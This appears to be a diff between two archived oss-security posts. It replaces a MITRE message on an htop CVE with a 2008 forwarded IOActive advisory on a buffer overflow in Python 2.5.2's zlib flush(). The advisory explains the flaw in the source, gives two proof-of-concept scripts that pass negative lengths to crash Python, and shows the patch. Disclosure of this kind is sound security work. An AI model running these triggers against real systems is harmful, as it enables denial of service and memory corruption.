@@ -1,51 +1,229 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2008/11/14/3
-Message-ID: <Pine.GSO.4.51.0811141224020.16900@faron.mitre.org>
-Date: Fri, 14 Nov 2008 12:35:41 -0500 (EST)
-From: "Steven M. Christey" <coley@...us.mitre.org>
-To: oss-security@...ts.openwall.com, jlieskov@...hat.com
-Subject: Re: CVE id request: htop
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2008/04/10/2
+Message-ID: <47FE47EE.9080800@freethemallocs.com>
+Date: Thu, 10 Apr 2008 09:01:34 -0800
+From: Jonathan Smith <smithj@...ethemallocs.com>
+To: oss-security@...ts.openwall.com
+CC: "Steven M. Christey" <coley@...us.mitre.org>
+Subject: buffer overflow in Python zlib extension module
 Content-Type: text/plain; charset=utf-8
 
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-Sorry Jan and Nico, I didn't follow up with you on this.  There were some
-questions about whether this deserved a CVE, since THOUSANDS of programs
-dump output without considering whether they're writing to a terminal...
-or what they're writing to a terminal.
+This should probably get a CVE... I don't think it is anywhere close to
+"Critical" as the author indicates; using the below test case, I can
+only get python to crash.
 
-For example, should the "cat" program become more terminal-aware and avoid
-sending dangerous sequences?  Which of dozens of different terminal types
-should it avoid sending these sequences to?  Should it get a new CVE every
-time it forgets about some other terminal?
+	smithj
 
-Not to mention "more" and "ls" and "grep" and many others.
+- -------- Original Message --------
+Subject: IOActive Security Advisory: Buffer overflow in Python zlib
+extension module
+Date: Wed, 9 Apr 2008 14:22:36 -0700 (PDT)
+From: Justin Ferguson <jferguson@...ctive.com>
+Organization: IOActive, Inc.
+To: full-disclosure@...ts.grok.org.uk
+CC: bugtraq@...urityfocus.com, vulnwatch@...nwatch.org
 
-We were forced to flag Apache a number of years ago because it didn't
-filter certain dangerous characters from its logs.  I always felt a bit
-funny about that one.
+Title:			Buffer overflow in Python zlib extension module
+Date Discoverd:		??-April-2008
+Date Reported:		08-April-2008
+Date Patched:		08-April-2008
+Date Disclosed:		09-April-2008
+Criticality:		Critical
 
-Hopefully you see why this is an edge case for us.
+Affected Products
+- -----------------
 
-In this specific case, however, apparently top performs this behavior,
-it's clearly intended to run in a terminal, *and* a vendor is stating it's
-a security issue.  So, CVE-2008-5076 has been assigned.
+Python 2.5.2, earlier and unstable version are likely to be vulnerable
 
-- Steve
+Synopsis
+- --------
 
-
-======================================================
-Name: CVE-2008-5076
-Status: Candidate
-URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5076
-Reference: MLIST:[oss-security] 20081102 CVE id request: htop
-Reference: URL:http://www.openwall.com/lists/oss-security/2008/11/02/1
-Reference: CONFIRM:http://bugs.debian.org/504144
-Reference: XF:htop-processname-weak-security(46321)
-Reference: URL:http://xforce.iss.net/xforce/xfdb/46321
-
-htop 0.7 writes process names to a terminal without sanitizing
-non-printable characters, which might allow local users to hide
-processes, modify arbitrary files, or have unspecified other impact
-via a process name with "crazy control strings."
+The zlib extension module contains a method for flushing decompression
+streams
+that takes an input parameter of how much data to flush. This parameter
+is a
+signed integer that is not verified for sanity and is thus potentially
+negative.
+When passed a negative value memory is misallocated and then the signed
+integer
+is converted to an unsigned integer resulting in buffer overflow.
 
 
+Techical Details
+- -----------------
+
+Python-2.5.2/Modules/zlibmodule.c:
+
+761 PyDoc_STRVAR(decomp_flush__doc__,
+762 "flush( [length] ) -- Return a string containing any remaining\n"
+763 "decompressed data. length, if given, is the initial size of the\n"
+764 "output buffer.\n"
+765 "\n"
+766 "The decompressor object can no longer be used after this call.");
+767
+768 static PyObject *
+769 PyZlib_unflush(compobject *self, PyObject *args)
+770 {
+771     int err, length = DEFAULTALLOC;
+772     PyObject * retval = NULL;
+773     unsigned long start_total_out;
+774
+775     if (!PyArg_ParseTuple(args, "|i:flush", &length))
+776         return NULL;
+777     if (!(retval = PyString_FromStringAndSize(NULL, length)))
+778         return NULL;
+779
+780
+781     ENTER_ZLIB
+782
+783     start_total_out = self->zst.total_out;
+784     self->zst.avail_out = length;
+785     self->zst.next_out = (Byte *)PyString_AS_STRING(retval);
+786
+787     Py_BEGIN_ALLOW_THREADS
+788     err = inflate(&(self->zst), Z_FINISH);
+789     Py_END_ALLOW_THREADS
+
+The PyArg_ParseTuple() function acts as a bridge between Python and C
+and
+initializes the length variable if one was provided. Then at line 777
+this
+variable is passed as the second parameter to
+PyString_FromStringAndSize().
+The second parameter to PyString_FromStringAndSize() is also signed, and
+the API call itself does not validate the parameter in non-debug builds.
+This value then has the size of a PyStringObject summed with it and is
+passed to the Python allocator which services the request. Upon
+successfull
+allocation the assignment at line 784 causes a sign conversion as the
+avail_out
+member of the zst structure is an unsigned variable. Then at line 785
+the
+pointer to the memory that was allocated at line 777 is assigned to the
+next_out
+member of the zst structure. This culminates in buffer overflow at line
+788
+when the zlib inflate() function decompresses data.
+
+
+Reproduction / Proof-of-Concept
+- -------------------------------
+
+When the length variable contains a value of -24 then the allocator is
+told
+to reserve 0 bytes of memory, however the allocator modifies the request
+and
+will allocate one byte of memory. For values ranging between -2 and -23
+a small
+amount of memory will be allocated due to being summed with the size of
+a
+PyStringObject. Both will mislead zlib into believing that there is
+several
+gigabytes of space available. If an attacker controls the input stream
+then they can avoid the obvious Denial of Service simply be making the
+available input large than the output buffer, but smaller than the
+size required to hit an unmapped or read-only page of memory.
+
+A semi-interesting note is that the value -1 will not work as when
+extracting
+this integer an API call mixes the return value and error code, with -1
+indicating that an error occurred. This check is done in conjunction
+with
+another check and thus does not cause the routine to fail, but rather
+causes
+PyArg_ParseTuple() to initialize the length variable with a value of 1.
+
+python-2.5.2-zlib-unflush-misallocation.py
+- ------------------------------------------
+#!/usr/bin/python
+
+import zlib
+
+msg = """
+Desire to know why, and how, curiosity; such as is in no living creature
+~        but man:
+so that man is distinguished, not only by his reason, but also by this
+~        singular passion
+from other animals; in whom the appetite of food, and other pleasures of
+~        sense, by
+predominance, take away the care of knowing causes; which is a lust of
+~        the mind,
+that by a perseverance of delight in the continual and indefatigable
+generation of knowledge, exceedeth the short vehemence of any carnal
+~        pleasure.
+"""
+
+compMsg = zlib.compress(msg)
+bad = -24
+decompObj = zlib.decompressobj()
+decompObj.decompress(compMsg)
+decompObj.flush(bad)
+
+
+python-2.5.2-zlib-unflush-signedness.py:
+- ----------------------------------------
+#!/usr/bin/python
+
+import zlib
+
+msg = """
+Society in every state is a blessing, but government even in its best
+~        state is but a necessary evil
+in its worst state an intolerable one; for when we suffer, or are
+~        exposed to the same miseries by a
+government, which we might expect in a country without government, our
+~        calamities is heightened by
+reflecting that we furnish the means by which we suffer! Government,
+~        like dress, is the badge of
+lost innocence; the palaces of kings are built on the ruins of the
+~        bowers of paradise. For were
+the impulses of conscience clear, uniform, and irresistibly obeyed, man
+~        would need no other
+lawgiver; but that not being the case, he finds it necessary to
+~        surrender up a part of his property
+to furnish means for the protection of the rest; and this he is induced
+~        to do by the same prudence which
+in every other case advises him out of two evils to choose the least.
+~        Wherefore, security being the true
+design and end of government, it unanswerably follows that whatever form
+~        thereof appears most likely to
+ensure it to us, with the least expense and greatest benefit, is
+~        preferable to all others.
+""" * 1024
+
+compMsg = zlib.compress(msg)
+bad = -2
+decompObj = zlib.decompressobj()
+decompObj.decompress(compMsg, 1)
+decompObj.flush(bad)
+
+
+Remediation
+- -----------
+
+This bug was patched in CVS and appends the following lines between 776
+and 777:
+
+~    if (length <= 0) {
+	PyErr_SetString(PyExc_ValueError, "length must be greater than zero");
+	return NULL;
+~    }
+
+Further details can be found at http://bugs.python.org/issue2586 and
+http://svn.python.org/view?rev=62235&view=rev
+
+
+
+
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2.0.9 (GNU/Linux)
+
+iEYEARECAAYFAkf+R+0ACgkQCG91qXPaRekwTACglEYkrNEmAkA94/+2OcUAZKnj
+sZ8AnA1QmxUXRTt+CSrIWBBYnG/wKBw6
+=zGo0
+-----END PGP SIGNATURE-----
